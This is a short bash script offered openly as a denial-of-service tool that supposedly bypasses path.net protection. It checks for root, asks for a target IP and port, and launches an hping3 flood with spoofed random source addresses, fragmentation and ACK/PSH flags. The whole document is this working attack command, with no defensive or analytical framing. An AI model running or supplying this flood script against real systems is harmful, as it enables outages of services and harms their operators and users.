#!/bin/bash
# ong insane defdose atteck methode by @yuk1meow

if [ "$(whoami)" != "root" ]; then
         echo -e "LAUNCH ME as ROOT"
        exit 255
fi


echo "Bash path.net Bypass by yuki"
echo "Coded with the cutting-edge technologies"
echo "Type Target IP: "
read -i $TARGET -e TARGET
echo "Type Target port: "
read -i $PORT -e PORT
hping3 --flood -A -P --tcp-timestamp --rand-source --frag -w 65535 --tcp-mss 1460 -p $PORT $TARGET > /dev/null
echo "Attack Started. To stop, press CTRL+C"
